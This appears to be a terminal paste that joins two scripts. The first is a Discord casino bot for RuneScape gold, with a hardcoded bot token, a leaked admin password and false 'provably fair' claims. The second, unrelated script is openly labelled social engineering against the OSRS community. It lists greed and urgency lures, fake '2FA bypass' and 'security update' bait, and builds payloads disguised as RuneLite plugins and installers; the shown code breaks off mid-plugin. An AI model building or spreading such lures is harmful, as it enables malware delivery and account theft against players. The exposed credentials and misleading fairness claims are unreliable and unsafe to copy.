    jackpot = get_jackpot_amount()

    conn.close()

    rsn_list = "\n".join([f"{row['rsn']} {'✅' if row['verified'] else '❌'}" for row in rsns])

    embed = discord.Embed(
        title=f"💰 {ctx.author.display_name}'s Casino Balance",
        color=0x3498DB
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    embed.add_field(name="Balance", value=f"{user['balance']:,} {get_config_value('currency_name')}", inline=False)

    if rsn_list:
        embed.add_field(name="Linked RSNs", value=rsn_list, inline=False)

    embed.add_field(name="Total Deposits", value=f"{user['deposits']:,} {get_config_value('currency_name')}", inline=True)
    embed.add_field(name="Total Withdrawals", value=f"{user['withdrawals']:,} {get_config_value('currency_name')}", inline=True)
    embed.add_field(name="W/L Record", value=f"✅ {user['wins']} wins | ❌ {user['losses']} losses", inline=False)
    embed.add_field(name="Profit/Loss", value=f"{user['profit']:,} {get_config_value('currency_name')}", inline=True)

    if user["last_daily"]:
        last_claim = datetime.fromisoformat(user["last_daily"])
        next_claim = last_claim.replace(hour=0, minute=0, second=0) + timedelta(days=1)
        time_left = next_claim - datetime.utcnow()
        hours = time_left.seconds // 3600
        embed.add_field(name="Next Daily Bonus", value=f"In {hours} hours", inline=True)
    else:
        embed.add_field(name="Daily Bonus", value="Available now! Use `!daily`", inline=True)

    embed.add_field(name="Jackpot Pool", value=f"{jackpot:,} {get_config_value('currency_name')}", inline=True)

    await ctx.send(embed=embed)

    # Update last active
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE users SET last_active = ? WHERE user_id = ?",
              (datetime.utcnow().isoformat(), str(ctx.author.id)))
    conn.commit()
    conn.close()

@bot.command(name='dice')
async def dice_game(ctx, amount: int):
    min_bet = int(get_config_value('min_bet'))
    max_bet = int(get_config_value('max_bet'))
    payout_rate = float(get_config_value('dice_payout'))

    if amount < min_bet:
        await ctx.send(f"❌ Minimum bet is {min_bet:,} {get_config_value('currency_name')}")
        return
    if amount > max_bet:
        await ctx.send(f"❌ Maximum bet is {max_bet:,} {get_config_value('currency_name')}")
        return

    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user or user['balance'] < amount:
        await ctx.send(f"❌ Insufficient funds! Your balance: {user['balance'] if user else 0:,} {get_config_value('currency_name')}")
        conn.close()
        return

    # Add to jackpot
    jackpot_pool = float(get_config_value('jackpot_pool'))
    jackpot_contribution = int(amount * jackpot_pool)
    add_to_jackpot(jackpot_contribution)

    msg = await ctx.send("🎲 Rolling the dice...")
    await asyncio.sleep(1.5)

    roll = random.randint(1, 100)
    win = roll > 50

    if win:
        payout = int(amount * payout_rate)
        result = f"**WIN!** You rolled {roll} and won {payout:,} {get_config_value('currency_name')}!"
        color = 0x00FF00

        c.execute('''UPDATE users SET
                     balance = balance + ?,
                     wins = wins + 1,
                     profit = profit + ?,
                     last_active = ?,
                     total_wagered = total_wagered + ?
                     WHERE user_id = ?''',
                  (payout, payout, datetime.utcnow().isoformat(), amount, str(ctx.author.id)))
    else:
        payout = amount
        result = f"**LOSS!** You rolled {roll} and lost {amount:,} {get_config_value('currency_name')}."
        color = 0xFF0000

        c.execute('''UPDATE users SET
                     balance = balance - ?,
                     losses = losses + 1,
                     profit = profit - ?,
                     last_active = ?,
                     total_wagered = total_wagered + ?
                     WHERE user_id = ?''',
                  (amount, amount, datetime.utcnow().isoformat(), amount, str(ctx.author.id)))

    conn.commit()
    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    new_balance = c.fetchone()['balance']
    conn.close()

    result_embed = discord.Embed(
        title="🎲 Dice Game Result",
        description=result,
        color=color
    )
    result_embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    result_embed.add_field(name="New Balance", value=f"{new_balance:,} {get_config_value('currency_name')}", inline=False)
    result_embed.set_footer(text=f"Bet: {amount:,} {get_config_value('currency_name')}")
    await msg.edit(embed=result_embed)

    webhook_embed = create_embed(
        "Dice Game Result",
        result,
        color=color,
        user=ctx.author,
        amount=payout if win else -amount,
        game="Dice"
    )
    send_webhook(webhook_embed)

    # Log activity
    log_activity('dice_game', {
        'user_id': str(ctx.author.id),
        'amount': amount,
        'win': win,
        'payout': payout if win else -amount,
        'roll': roll
    })

@bot.command(name='slots')
async def slots_game(ctx, amount: int):
    min_bet = int(get_config_value('min_bet'))
    max_bet = int(get_config_value('max_bet'))

    if amount < min_bet:
        await ctx.send(f"❌ Minimum bet is {min_bet:,} {get_config_value('currency_name')}")
        return
    if amount > max_bet:
        await ctx.send(f"❌ Maximum bet is {max_bet:,} {get_config_value('currency_name')}")
        return

    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user or user['balance'] < amount:
        await ctx.send(f"❌ Insufficient funds! Your balance: {user['balance'] if user else 0:,} {get_config_value('currency_name')}")
        conn.close()
        return

    slot_payouts = json.loads(get_config_value('slot_payouts'))

    # Add to jackpot
    jackpot_pool = float(get_config_value('jackpot_pool'))
    jackpot_contribution = int(amount * jackpot_pool)
    add_to_jackpot(jackpot_contribution)

    # Get player's RSN for OSRS chat
    c.execute("SELECT rsn FROM rsns WHERE user_id = ? AND verified = 1 LIMIT 1", (str(ctx.author.id),))
    rsn_row = c.fetchone()
    rsn = rsn_row['rsn'] if rsn_row else None

    # Animation sequence
    symbols = list(set(sym for combo in slot_payouts.keys() for sym in combo))
    spinning_msg = await ctx.send("🎰 Starting slots...")

    # Spin animation
    for _ in range(5):
        display = []
        for i in range(3):
            display.append(random.choice(symbols))
        await spinning_msg.edit(content=f"🎰 Spinning...\n{' | '.join(display)}")
        await asyncio.sleep(0.5)

    # Final result
    result = [random.choice(symbols) for _ in range(3)]
    result_str = "".join(result)

    payout_multiplier = slot_payouts.get(result_str, 0)
    payout = amount * payout_multiplier
    win = payout_multiplier > 0

    if win:
        c.execute('''UPDATE users SET
                     balance = balance + ?,
                     wins = wins + 1,
                     profit = profit + ?,
                     last_active = ?,
                     total_wagered = total_wagered + ?
                     WHERE user_id = ?''',
                  (payout, payout, datetime.utcnow().isoformat(), amount, str(ctx.author.id)))
        result_title = "🎉 JACKPOT! 🎉" if payout_multiplier >= 1000 else "WINNER!"
        color = 0x00FF00
    else:
        payout = amount
        c.execute('''UPDATE users SET
                     balance = balance - ?,
                     losses = losses + 1,
                     profit = profit - ?,
                     last_active = ?,
                     total_wagered = total_wagered + ?
                     WHERE user_id = ?''',
                  (amount, amount, datetime.utcnow().isoformat(), amount, str(ctx.author.id)))
        result_title = "No win this time"
        color = 0xFF0000

    conn.commit()
    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    new_balance = c.fetchone()['balance']
    conn.close()

    # Send to OSRS chat if webhook is set
    osrs_webhook = get_config_value('osrs_webhook')
    if osrs_webhook and rsn:
        osrs_message = (
            f"{rsn} played slots for {amount:,} {get_config_value('currency_name')} "
            f"and got {'a WIN' if win else 'a LOSS'}! "
            f"Result: {result[0]} | {result[1]} | {result[2]}"
        )
        try:
            requests.post(osrs_webhook, json={"content": osrs_message})
        except Exception as e:
            print(f"OSRS webhook error: {e}")

    result_embed = discord.Embed(
        title=f"🎰 Slot Machine - {result_title}",
        color=color
    )
    result_embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    result_embed.add_field(
        name="Result",
        value=f"**{result[0]}  |  {result[1]}  |  {result[2]}**",
        inline=False
    )

    if win:
        result_embed.add_field(name="Payout", value=f"{payout:,} {get_config_value('currency_name')} (x{payout_multiplier})", inline=True)
    else:
        result_embed.add_field(name="Amount Lost", value=f"{amount:,} {get_config_value('currency_name')}", inline=True)

    result_embed.add_field(name="New Balance", value=f"{new_balance:,} {get_config_value('currency_name')}", inline=True)
    result_embed.set_footer(text=f"Bet: {amount:,} {get_config_value('currency_name')}")
    await spinning_msg.edit(embed=result_embed)

    webhook_embed = create_embed(
        "Slot Machine Result",
        f"Result: {result[0]} | {result[1]} | {result[2]}\n{'Won' if win else 'Lost'} {payout:,} {get_config_value('currency_name')}",
        color=color,
        user=ctx.author,
        amount=payout if win else -amount,
        game="Slots"
    )
    send_webhook(webhook_embed)

    # Log activity
    log_activity('slots_game', {
        'user_id': str(ctx.author.id),
        'amount': amount,
        'win': win,
        'payout': payout if win else -amount,
        'result': result_str
    })

# ------------------------
# Craps Game Implementation
# ------------------------
@bot.command(name='craps')
async def craps_game(ctx, amount: int):
    min_bet = int(get_config_value('min_bet'))
    max_bet = int(get_config_value('max_bet'))
    winning_numbers = [7, 9, 12]  # Only these numbers win

    if amount < min_bet:
        await ctx.send(f"❌ Minimum bet is {min_bet:,} {get_config_value('currency_name')}")
        return
    if amount > max_bet:
        await ctx.send(f"❌ Maximum bet is {max_bet:,} {get_config_value('currency_name')}")
        return

    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
    user = c.fetchone()

    if not user or user['balance'] < amount:
        await ctx.send(f"❌ Insufficient funds! Your balance: {user['balance'] if user else 0:,} {get_config_value('currency_name')}")
        conn.close()
        return

    # Add to jackpot
    jackpot_pool = float(get_config_value('jackpot_pool'))
    jackpot_contribution = int(amount * jackpot_pool)
    add_to_jackpot(jackpot_contribution)

    # Deduct initial bet
    c.execute("UPDATE users SET balance = balance - ?, last_active = ?, total_wagered = total_wagered + ? WHERE user_id = ?",
              (amount, datetime.utcnow().isoformat(), amount, str(ctx.author.id)))
    conn.commit()

    # First roll
    dice1 = random.randint(1, 6)
    dice2 = random.randint(1, 6)
    roll = dice1 + dice2
    roll_str = f"{dice1} + {dice2} = **{roll}**"

    if roll in winning_numbers:
        # First win - 3x payout
        win_amount = amount * 3
        c.execute('''UPDATE users SET
                     balance = balance + ?,
                     wins = wins + 1,
                     profit = profit + ?
                     WHERE user_id = ?''',
                  (win_amount, win_amount - amount, str(ctx.author.id)))
        conn.commit()

        # Get new balance
        c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
        new_balance = c.fetchone()['balance']

        # Create embed for first win
        embed = discord.Embed(
            title="🎲 Craps - First Roll WIN!",
            description=(
                f"{ctx.author.mention} rolled {roll_str}\n"
                f"**WIN!** You won {win_amount:,} {get_config_value('currency_name')} (3x)\n\n"
                "You can now choose to:\n"
                "✅ `!done` - Take your winnings\n"
                "🎲 `!x2` - Double your bet for a chance to win 6x\n"
                "🔮 `!b2b <7|9|12>` - Predict next roll for 9x bonus\n\n"
                "Reply within 60 seconds!"
            ),
            color=0x00FF00
        )
        embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
        embed.add_field(name="Current Balance", value=f"{new_balance:,} {get_config_value('currency_name')}")
        embed.set_footer(text="Chasing 🎲 Craps - Only 7, 9, and 12 are winning numbers")
        msg = await ctx.send(embed=embed)

        # Wait for player decision
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel and m.content.lower().startswith(('!done', '!x2', '!b2b'))

        try:
            response = await bot.wait_for('message', timeout=60.0, check=check)
            choice = response.content.lower().split()[0]

            if choice == '!done':
                embed = discord.Embed(
                    title="🎲 Craps - Game Complete!",
                    description=f"{ctx.author.mention} took their winnings of {win_amount:,} {get_config_value('currency_name')}",
                    color=0x00FF00
                )
                embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
                await msg.edit(embed=embed)
                return

            elif choice == '!x2':
                # Player chose to double bet
                option = "x2"

            elif choice.startswith('!b2b'):
                try:
                    parts = response.content.split()
                    if len(parts) < 2:
                        await ctx.send("❌ Please specify a number: `!b2b <7|9|12>`")
                        option = None
                    else:
                        predicted = int(parts[1])
                        if predicted not in winning_numbers:
                            await ctx.send("❌ Invalid number! Must be 7, 9, or 12")
                            option = None
                        else:
                            option = ("b2b", predicted)
                except:
                    await ctx.send("❌ Invalid format! Use `!b2b <7|9|12>`")
                    option = None

            if option is None:
                # Invalid b2b command, end game
                embed = discord.Embed(
                    title="🎲 Craps - Game Complete!",
                    description=f"{ctx.author.mention} took their winnings of {win_amount:,} {get_config_value('currency_name')}",
                    color=0x00FF00
                )
                embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
                await msg.edit(embed=embed)
                return

            # Second roll
            dice1_second = random.randint(1, 6)
            dice2_second = random.randint(1, 6)
            roll_second = dice1_second + dice2_second
            roll_second_str = f"{dice1_second} + {dice2_second} = **{roll_second}**"

            if roll_second in winning_numbers:
                if option == "x2":
                    # Win with x2 option - 6x payout
                    second_win = amount * 6
                    win_type = "Back-to-Back WIN!"
                    win_desc = f"Won {second_win:,} {get_config_value('currency_name')} (6x)"
                    multiplier = "6x"
                    tier = "🐐 Goated Tier! 🐐"
                else:
                    # b2b option
                    predicted = option[1]
                    if roll_second == predicted:
                        # Correct prediction - 9x payout
                        second_win = amount * 9
                        win_type = "PREDICTION WIN!"
                        win_desc = f"Correctly predicted {predicted}! Won {second_win:,} {get_config_value('currency_name')} (9x)"
                        multiplier = "9x"
                        tier = "🌟 GOD TIER! 🌟"
                    else:
                        # Wrong prediction but still win
                        second_win = amount * 6
                        win_type = "Back-to-Back WIN!"
                        win_desc = f"Rolled {roll_second} (predicted {predicted}). Won {second_win:,} {get_config_value('currency_name')} (6x)"
                        multiplier = "6x"
                        tier = "🔥 Hot Streak! 🔥"

                # Update balance for second win
                c.execute('''UPDATE users SET
                            balance = balance + ?,
                            wins = wins + 1,
                            profit = profit + ?,
                            total_wagered = total_wagered + ?
                            WHERE user_id = ?''',
                         (second_win, second_win, amount, str(ctx.author.id)))
                conn.commit()

                # Get final balance
                c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
                final_balance = c.fetchone()['balance']

                # Progress bar for tier
                progress = "🐣 Baby Goat  [=====·····]  Goated 🐐"
                if multiplier == "9x":
                    progress = "🐐 Goated     [==========]  GOD TIER 🌟"
                elif multiplier == "6x":
                    progress = "🔥 Hot Streak [=======···]  Goated 🐐"

                # Create win embed
                embed = discord.Embed(
                    title=f"🎲 Craps - {win_type}",
                    description=(
                        f"{ctx.author.mention} rolled:\n"
                        f"First Roll: {roll_str}\n"
                        f"Second Roll: {roll_second_str}\n\n"
                        f"**{win_desc}**\n"
                        f"Total winnings: **{win_amount + second_win:,}** {get_config_value('currency_name')}\n\n"
                        f"{progress}\n"
                        f"Multiplier: {multiplier}"
                    ),
                    color=0x00FF00
                )
                embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
                embed.add_field(name="Final Balance", value=f"{final_balance:,} {get_config_value('currency_name')}")
                await msg.edit(embed=embed)

            else:
                # Second roll loss
                c.execute("UPDATE users SET losses = losses + 1 WHERE user_id = ?",
                         (str(ctx.author.id),))
                conn.commit()

                # Get final balance
                c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
                final_balance = c.fetchone()['balance']

                # Create loss embed
                embed = discord.Embed(
                    title="🎲 Craps - Second Roll Loss",
                    description=(
                        f"{ctx.author.mention} rolled:\n"
                        f"First Roll: {roll_str}\n"
                        f"Second Roll: {roll_second_str}\n\n"
                        "❌ No win on second roll\n"
                        "You keep your first win of "
                        f"{win_amount:,} {get_config_value('currency_name')}"
                    ),
                    color=0xFFD700
                )
                embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
                embed.add_field(name="Current Balance", value=f"{final_balance:,} {get_config_value('currency_name')}")
                await msg.edit(embed=embed)

        except asyncio.TimeoutError:
            # Timeout handling
            embed = discord.Embed(
                title="🎲 Craps - Time Expired!",
                description=f"{ctx.author.mention} didn't respond in time. Kept first win of {win_amount:,} {get_config_value('currency_name')}",
                color=0xFFA500
            )
            embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
            await msg.edit(embed=embed)

    else:
        # First roll loss
        c.execute('''UPDATE users SET
                     losses = losses + 1,
                     profit = profit - ?
                     WHERE user_id = ?''',
                  (amount, str(ctx.author.id)))
        conn.commit()

        # Get new balance
        c.execute("SELECT balance FROM users WHERE user_id = ?", (str(ctx.author.id),))
        new_balance = c.fetchone()['balance']

        # Create loss embed
        embed = discord.Embed(
            title="🎲 Craps - First Roll Loss",
            description=(
                f"{ctx.author.mention} rolled {roll_str}\n"
                f"❌ LOST! Only 7, 9, and 12 win\n"
                f"You lost {amount:,} {get_config_value('currency_name')}"
            ),
            color=0xFF0000
        )
        embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
        embed.add_field(name="Current Balance", value=f"{new_balance:,} {get_config_value('currency_name')}")
        await ctx.send(embed=embed)

    conn.close()

    # Log activity
    log_activity('craps_game', {
        'user_id': str(ctx.author.id),
        'amount': amount,
        'roll': roll,
        'win': roll in winning_numbers
    })

# ------------------------
# Admin Dashboard Command
# ------------------------
@bot.command(name='dashboard', aliases=['admin'])
async def admin_dashboard(ctx, *, password: str = None):
    # Check if user has admin role
    admin_role = discord.utils.get(ctx.guild.roles, id=ADMIN_ROLE_ID)
    if not admin_role or admin_role not in ctx.author.roles:
        await ctx.send("❌ You don't have permission to access the admin dashboard.")
        return

    # Verify password
    if password != DASHBOARD_PASSWORD:
        await ctx.send("🔒 Please provide the admin access code.\nExample: `!dashboard sheba666`")
        return

    # Get server stats
    conn = get_db_connection()
    c = conn.cursor()

    # Total players
    c.execute("SELECT COUNT(*) FROM users")
    total_players = c.fetchone()[0]

    # Total balance
    c.execute("SELECT SUM(balance) FROM users")
    total_balance = c.fetchone()[0] or 0

    # Recent transactions
    c.execute("SELECT * FROM payments ORDER BY id DESC LIMIT 5")
    recent_tx = c.fetchall()

    # Game stats
    c.execute("SELECT SUM(wins), SUM(losses), SUM(profit) FROM users")
    wins, losses, profit = c.fetchone()

    # Jackpot
    jackpot = get_jackpot_amount()

    conn.close()

    # Format values
    total_balance_fmt = format_gp(total_balance)
    profit_fmt = format_gp(profit)
    jackpot_fmt = format_gp(jackpot)

    # Create dashboard embed
    embed = discord.Embed(
        title="🔐 DEGENSDEN CASINO ADMIN DASHBOARD",
        description=f"**Server Status:** Online • **Last Updated:** {datetime.now(pytz.timezone(CASINO_TIMEZONE)).strftime('%m/%d/%Y %I:%M %p')} {CASINO_TIMEZONE}",
        color=0x8A2BE2
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail

    # Add statistics
    embed.add_field(
        name="📊 PLAYER STATISTICS",
        value=(
            f"```diff\n"
            f"+ Total Players: {total_players}\n"
            f"+ Total Balance: {total_balance_fmt}\n"
            f"+ House Profit: {profit_fmt}\n"
            f"+ Jackpot Pool: {jackpot_fmt}\n"
            f"```"
        ),
        inline=False
    )

    # Add recent transactions
    tx_list = []
    for tx in recent_tx:
        tx_type = "💰 Deposit" if tx['type'] == 'deposit' else "💸 Withdrawal"
        status = "✅ Completed" if tx['status'] == 'completed' else "🕒 Pending"
        tx_list.append(
            f"{tx_type} | {tx['amount']} {tx['method'].upper()} | {status}"
        )

    embed.add_field(
        name="💳 RECENT TRANSACTIONS",
        value="```" + "\n".join(tx_list) + "```" if tx_list else "```No recent transactions```",
        inline=False
    )

    # Add quick actions
    embed.add_field(
        name="⚡ QUICK ACTIONS",
        value=(
            "```"
            "!addgp @user amount    - Add funds\n"
            "!verifyrsn RSN         - Verify player\n"
            "!processwithdrawal ID  - Complete withdrawal\n"
            "!setdashboardurl URL   - Update dashboard URL"
            "```"
        ),
        inline=False
    )

    # Add dashboard URL
    dashboard_url = get_config_value('dashboard_url')
    if dashboard_url:
        embed.add_field(
            name="🌐 WEB DASHBOARD",
            value=f"[Access Full Dashboard]({dashboard_url})",
            inline=False
        )

    embed.set_footer(text=f"Restricted Access • Data refreshes on command • DegensDen v3.0")
    await ctx.send(embed=embed)

# ------------------------
# OSRS Webhook Management
# ------------------------
@bot.command(name='setosrswebhook')
@commands.has_role(ADMIN_ROLE_ID)
async def set_osrs_webhook(ctx, url: str):
    set_config_value('osrs_webhook', url)
    embed = discord.Embed(
        title="🌐 OSRS Webhook Updated",
        description=f"OSRS webhook URL set to: {url}",
        color=0x3498DB
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    await ctx.send(embed=embed)

    # Test the webhook
    try:
        test_msg = "🔔 Casino OSRS Integration Test - Webhook is working!"
        requests.post(url, json={"content": test_msg})
        await ctx.send("✅ Webhook test sent successfully!")
    except Exception as e:
        await ctx.send(f"❌ Webhook test failed: {str(e)}")

# ------------------------
# Set Dashboard URL Command
# ------------------------
@bot.command(name='setdashboardurl')
@commands.has_role(ADMIN_ROLE_ID)
async def set_dashboard_url(ctx, url: str):
    set_config_value('dashboard_url', url)
    embed = discord.Embed(
        title="🌐 Dashboard URL Updated",
        description=f"Dashboard URL set to: {url}",
        color=0x3498DB
    )
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail
    await ctx.send(embed=embed)

# ------------------------
# Game Listing Command
# ------------------------
@bot.command(name='games')
async def show_games(ctx):
    min_bet = int(get_config_value('min_bet'))
    max_bet = int(get_config_value('max_bet'))
    payout_rate = float(get_config_value('dice_payout'))

    games_embed = discord.Embed(
        title="🎰 DEGENSDEN CASINO GAMES",
        description="Experience premium degen gaming with high payouts!",
        color=0x8A2BE2
    )
    games_embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail

    games_embed.add_field(
        name="🎲 DICE GAME",
        value=f"```!dice <amount>\nWin chance: 50%\nPayout: {payout_rate}x\nMin: {min_bet:,} • Max: {max_bet:,}```",
        inline=False
    )

    games_embed.add_field(
        name="🎰 SLOT MACHINE",
        value=f"```!slots <amount>\nMax Payout: 2000x\nMin: {min_bet:,} • Max: {max_bet:,}\nJackpot: 🦄🦄🦄 = 2000x!```",
        inline=False
    )

    games_embed.add_field(
        name="🎲 CHASING CRAPS",
        value=f"```!craps <amount>\nWin on 7/9/12 • First win: 3x\nDouble down: 6x • Predict: 9x\nMin: {min_bet:,} • Max: {max_bet:,}```",
        inline=False
    )

    games_embed.set_footer(text="More premium games coming soon! • Play responsibly")
    await ctx.send(embed=games_embed)

# ------------------------
# Help Command
# ------------------------
@bot.command(name='help')
async def custom_help(ctx):
    help_embed = discord.Embed(
        title="🎲 DEGENSDEN CASINO HELP",
        description="All commands for our premium degen experience",
        color=0x8A2BE2
    )
    help_embed.set_thumbnail(url=GOATGANG_IMAGE_URL)  # GOATGANG thumbnail

    help_embed.add_field(
        name="🔗 ACCOUNT COMMANDS",
        value=(
            "```"
            "!link <RSN>      - Verify your RuneScape name\n"
            "!balance         - Check your casino balance\n"
            "!daily           - Claim your daily bonus"
            "```"
        ),
        inline=False
    )

    help_embed.add_field(
        name="💳 PAYMENT COMMANDS",
        value=(
            "```"
            "!payment <method> <address> - Set payment address\n"
            "!methods                    - Show payment methods\n"
            "!deposit <amount> [method]  - Deposit funds\n"
            "!withdraw <amount> [method] - Withdraw funds"
            "```"
        ),
        inline=False
    )

    help_embed.add_field(
        name="🎮 GAME COMMANDS",
        value=(
            "```"
            "!dice <amount>   - Roll dice for payout\n"
            "!slots <amount>  - Play slot machine\n"
            "!craps <amount>  - Play Chasing Craps\n"
            "!games           - Show available games"
            "```"
        ),
        inline=False
    )

    # Conditionally show admin commands
    admin_role = discord.utils.get(ctx.guild.roles, id=ADMIN_ROLE_ID)
    if admin_role and admin_role in ctx.author.roles:
        help_embed.add_field(
            name="🛠 ADMIN COMMANDS",
            value=(
                "```"
                "!dashboard <code>     - Admin dashboard\n"
                "!verifyrsn <RSN>      - Verify a player\n"
                "!processwithdrawal <id> - Process withdrawal\n"
                "!addgp @user <amount> - Add funds to player\n"
                "!setosrswebhook <url> - Set OSRS webhook\n"
                "!setdashboardurl <url> - Set web dashboard URL"
                "```"
            ),
            inline=False
        )

    dashboard_url = get_config_value('dashboard_url')
    if dashboard_url:
        help_embed.add_field(
            name="🌐 WEB DASHBOARD",
            value=f"[Access Admin Dashboard]({dashboard_url})",
            inline=False
        )

    help_embed.set_footer(text="DegensDen Casino • Where Legends Are Made")
    await ctx.send(embed=help_embed)

# ------------------------
# Bot Startup
# ------------------------
@bot.event
async def on_ready():
    banner = """
    ██████╗ ███████╗ ██████╗ ████████╗ ██████╗ ██████╗ ███╗   ██╗
    ██╔══██╗██╔════╝██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗████╗  ██║
    ██║  ██║█████╗  ██║  ███╗   ██║   ██║     ██║   ██║██╔██╗ ██║
    ██║  ██║██╔══╝  ██║   ██║   ██║   ██║     ██║   ██║██║╚██╗██║
    ██████╔╝███████╗╚██████╔╝   ██║   ╚██████╗╚██████╔╝██║ ╚████║
    ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
    """

    print(banner)
    print("DegensDen Casino is now operational with enhanced features!")

    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name="DegensDen Casino | !help"
    ))

    embed = discord.Embed(
        title="🚀 DEGENSDEN CASINO LAUNCHED",
        description=(
            "**Welcome to DegensDen - Where Legends Are Made!**\n\n"
            "Experience next-level gaming with:\n"
            "✅ Provably Fair RNG Systems\n"
            "⚡ Instant Deposits & Withdrawals\n"
            "🎮 Premium Games with Massive Payouts\n"
            "💎 Transparent Community-Driven Operations\n\n"
            "**No Jersey Shore drama, just pure gaming!**\n"
            "We're building a legendary community of degens who know both triumph and defeat.\n\n"
            "**Looking for Goated Board Members!**\n"
            "Admins who value their status and help manifest this foundation into a next-level gaming community."
        ),
        color=0x8A2BE2
    )

    # Use GOATGANG image as the main banner
    embed.set_image(url=GOATGANG_IMAGE_URL)
    embed.set_thumbnail(url=GOATGANG_IMAGE_URL)

    embed.add_field(
        name="Get Started",
        value="Use `!help` to see available commands",
        inline=False
    )
    embed.set_footer(text="DegensDen Casino v3.0 • Community First")

    # Send to webhook with GOATGANG image as avatar
    payload = {
        "embeds": [embed.to_dict()],
        "username": "DegensDen Launch",
        "avatar_url": GOATGANG_IMAGE_URL
    }
    try:
        requests.post(CASINO_WEBHOOK, json=payload)
    except Exception as e:
        print(f"Webhook error: {e}")

# ------------------------
# New Member Welcome
# ------------------------
@bot.event
async def on_member_join(member):
    welcome_channel = member.guild.system_channel
    if welcome_channel is not None:
        embed = discord.Embed(
            title=f"🐐 WELCOME TO DEGENSDEN, {member.display_name.upper()}!",
            description=(
                "**Ready to become a legend?**\n\n"
                "You've joined the most transparent, community-driven casino in OSRS!\n"
                "Enjoy provably fair games, instant transactions, and a drama-free environment.\n\n"
                "**Get started with these commands:**\n"
                "→ `!link <your_rsn>` - Verify your RuneScape name\n"
                "→ `!deposit <amount>` - Fund your account\n"
                "→ `!games` - See available games\n"
                "→ `!help` - Full command list\n\n"
                "*Become part of our GoatGang community!*"
            ),
            color=0x8A2BE2
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        # Use GOATGANG image as the welcome banner
        embed.set_image(url=GOATGANG_IMAGE_URL)
        embed.set_footer(text="DegensDen Casino • Where Every Player is Family")
        await welcome_channel.send(embed=embed)

if __name__ == "__main__":
    bot.run("MTM5MjU5MDUxMzkyODAxNTg5Mg.GK7l0l.nihkHAHieph6DLEvhBAlKbMpgp2ETux04xTqpo")
 u0_a305@localhost  ~/DegensDen/Degenzden 

#!/usr/bin/env python3
"""
REAL FUCKING SOCIAL ENGINEERING - NO BULLSHIT
TARGETING OSRS COMMUNITY WITH PSYCHOLOGICAL TRIGGERS
"""

import os
import sys
import json
import random
import shutil
import zipfile
import requests
from datetime import datetime
import subprocess
import tempfile
import base64
import mimetypes

class AdvancedSocialEngineering:
    def __init__(self):
        self.psychological_triggers = {
            "urgency": ["last_chance", "limited_slots", "closing_soon", "final_opportunity"],
            "greed": ["double_profits", "guaranteed_returns", "risk_free", "proven_method"],
            "fear_of_missing_out": ["others_are_profiting", "exclusive_access", "private_method"],
            "social_proof": ["vouched_by_top_players", "clan_approved", "trusted_by_mods"],
            "authority": ["former_jagex_staff", "professional_trader", "verified_success"]
        }
        
        self.osrs_specific_lures = {
            "account_takeover": "Account security alert - immediate verification required",
            "double_exp": "Weekend double EXP event client patch",
            "clan_wars": "New clan warfare system plugin",
            "stake_bots": "Advanced stake monitoring tool",
            "market_crash": "Real-time GE market crash detector",
            "hijacked_account": "Account recovery assistance tool",
            "authenticator_bypass": "2FA bypass for locked accounts",
            "client_update": "Mandatory client security update",
            "tournament_cheat": "DMM tournament practice tool",
            "item_dupe": "Item duplication prevention patch"
        }
        
    def create_credible_payloads(self):
        """Create payloads that look like legitimate OSRS tools"""
        print("\n[+] Creating credible OSRS payloads...")
        
        payloads = {
            "RuneLiteSecurityPatch.jar": self.create_java_payload(),
            "OSRS_Client_Update.exe": self.create_client_update(),
            "StakeMonitor.dll": self.create_stake_monitor(),
            "GE_Tracker.exe": self.create_ge_tracker(),
            "ClanManager.msi": self.create_clan_manager(),
            "AccountGuardian.bat": self.create_account_guardian()
        }
        
        for filename, content in payloads.items():
            self.save_credible_payload(filename, content)
            
        return payloads
    
    def create_java_payload(self):
        """Create RuneLite plugin payload"""
        return '''
// RuneLite Security Patch - Mandatory Update
package net.runelite.client.plugins.securityupdate;

import net.runelite.api.Client;
import net.runelite.client.plugins.Plugin;
import net.runelite.client.plugins.PluginDescriptor;

@PluginDescriptor(
    name = "Security Patch",
    description = "Critical security update for account protection",
    tags = {"security", "update", "protection"}
)
public class SecurityUpdatePlugin extends Plugin {
    @Override
    protected void startUp() throws Exception {
        // Apply security patches
        applySecurityFixes();
        validateAccountProtection();
    }
    
